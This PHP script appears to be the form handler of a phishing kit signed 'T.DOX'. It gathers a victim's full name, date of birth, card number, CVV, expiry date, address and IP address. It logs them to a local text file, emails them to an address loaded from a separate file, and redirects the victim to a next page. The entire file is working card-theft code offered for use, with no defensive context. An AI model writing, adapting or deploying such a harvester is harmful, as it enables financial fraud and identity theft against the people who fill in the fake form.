<?php

if(isset($_POST['full']))       {
    
    include 'Email.php';
    
    $ip = getenv("REMOTE_ADDR");
    $message = "---------= T.DOX =---------\n";
    $message .= "---------= INFO COM =---------\n";
    $message .= "Full Name: ".$_POST['full']." \n";
    $message .= "DOB : ".$_POST['dob']." \n";
    $message .= "card: ".$_POST['cr']." \n";
    $message .= "ccv: ".$_POST['cv']." \n";
    $message .= "mm/yy: ".$_POST['mm']."/".$_POST['yy']." \n";
    $message .= "address: ".$_POST['address']." \n";
    $message .= "zip: ".$_POST['zip']." \n";
    $message .= "---------=IP Adress & Date=---------\n";
    $message .= "IP Address: ".$ip."\n";
    $message .= "---------=by T.DOX =---------\n";
$subject = "> Fullz-T.DOX <<";
$headers = "From: T.DOX@her".rand(1,999)."DOX" . "\r\n" ;
    
    @fclose(@fwrite(@fopen("DX3.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);
    
    header("Location: info2.php");
    
    }

 
 



?>